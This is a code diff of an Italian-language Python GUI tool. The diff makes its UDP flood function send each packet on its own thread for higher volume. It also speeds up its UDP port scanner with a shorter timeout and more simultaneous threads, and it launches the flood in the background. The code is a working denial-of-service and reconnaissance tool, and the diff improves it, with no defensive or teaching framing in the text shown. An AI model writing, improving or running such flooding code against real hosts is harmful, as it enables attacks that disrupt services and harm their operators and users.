@@ -12,25 +12,34 @@ def generate_packet(size):
 # Funzione per eseguire un UDP Flood
 def udp_flood(target_ip, target_port, packet_size, packet_count):
     """Simula un UDP flood inviando pacchetti verso l'IP e la porta specificati."""
+    def send_packet():
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
+                packet = generate_packet(packet_size)
+                sock.sendto(packet, (target_ip, target_port))
+        except Exception as e:
+            print(f"Errore durante l'invio del pacchetto: {e}")
+
+    print(f"Inizio attacco UDP flood su {target_ip}:{target_port}")
+    threads = []
     try:
-        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
-            print(f"Inizio attacco UDP flood su {target_ip}:{target_port}")
-            for i in range(packet_count):
-                try:
-                    packet = generate_packet(packet_size)
-                    sock.sendto(packet, (target_ip, target_port))
-                    print(f"[{i + 1}/{packet_count}] Pacchetto inviato")
-                except Exception as e:
-                    print(f"Errore durante l'invio del pacchetto: {e}")
-                    break
-            print("Attacco completato!")
+        for _ in range(packet_count):
+            thread = threading.Thread(target=send_packet)
+            thread.daemon = True
+            threads.append(thread)
+            thread.start()
+
+        for thread in threads:
+            thread.join()
+
+        print("Attacco completato!")
     except Exception as e:
         print(f"Errore generale nell'UDP Flood: {e}")
 
 # Funzione per scansionare una singola porta UDP
 def scan_udp_port(target_ip, port, open_ports, output_widget, lock):
     with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
-        s.settimeout(0.5)
+        s.settimeout(0.01)
         try:
             s.sendto(b"", (target_ip, port))
             s.recvfrom(1024)
@@ -50,20 +59,24 @@ def scan_udp_ports(target_ip, output_widget):
     output_widget.delete(1.0, tk.END)  # Cancella il contenuto precedente
 
     def scan_callback():
-        for port in range(1, 1025):  # Ridotto il range per test più rapidi
-            thread = threading.Thread(target=scan_udp_port, args=(target_ip, port, open_ports, output_widget, lock))
-            threads.append(thread)
-            thread.start()
+        try:
+            for port in range(1, 1025):
+                thread = threading.Thread(target=scan_udp_port, args=(target_ip, port, open_ports, output_widget, lock))
+                thread.daemon = True
+                threads.append(thread)
+                thread.start()
 
-            if len(threads) >= 50:
-                for t in threads:
-                    t.join()
-                threads.clear()
+                if len(threads) >= 100:  # Aumenta il numero di thread simultanei
+                    for t in threads:
+                        t.join()
+                    threads.clear()
 
-        for t in threads:
-            t.join()
+            for t in threads:
+                t.join()
 
-        messagebox.showinfo("Scansione completata", f"Scansione completata. Porte aperte trovate: {len(open_ports)}")
+            messagebox.showinfo("Scansione completata", f"Scansione completata. Porte aperte trovate: {len(open_ports)}")
+        except Exception as e:
+            messagebox.showerror("Errore", f"Errore durante la scansione: {e}")
 
     threading.Thread(target=scan_callback, daemon=True).start()
 
@@ -91,8 +104,8 @@ def start_udp_flood():
         target_port = int(target_port)
         packet_size = int(packet_size)
         packet_count = int(packet_count)
-        udp_flood(target_ip, target_port, packet_size, packet_count)
-        messagebox.showinfo("Successo", "Attacco UDP flood completato!")
+        threading.Thread(target=udp_flood, args=(target_ip, target_port, packet_size, packet_count), daemon=True).start()
+        messagebox.showinfo("In corso", "Attacco UDP flood avviato!")
     except ValueError:
         messagebox.showerror("Errore", "Porta, dimensione pacchetti e numero pacchetti devono essere numeri interi!")
     except Exception as e:
